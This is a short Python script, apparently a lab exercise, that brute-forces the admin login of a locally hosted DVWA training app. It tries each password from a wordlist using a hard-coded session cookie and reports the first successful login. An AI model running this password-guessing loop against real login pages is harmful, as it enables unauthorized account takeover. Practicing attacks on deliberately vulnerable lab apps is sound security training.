import requests

# URL of the login form
url = "http://localhost/DVWA/vulnerabilities/brute/"

# Fixed username
username = "admin"

# Password list file
with open("passwords.txt", "r") as file:
    passwords = file.readlines()

# Session cookies from browser (after login to DVWA and set security to low)
cookies = {
    "PHPSESSID": "qmdps83lq951aeakirk4n282fc",
    "security": "low"
}

# Loop through each password and try to log in
for password in passwords:
    password = password.strip()
    
    data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    response = requests.post(url, data=data, cookies=cookies)

    if "Welcome to the password protected area" in response.text:
        print(f"[+] Successful login: {username}:{password}")
        break
    else:
        print(f"[-] Failed login: {username}:{password}")
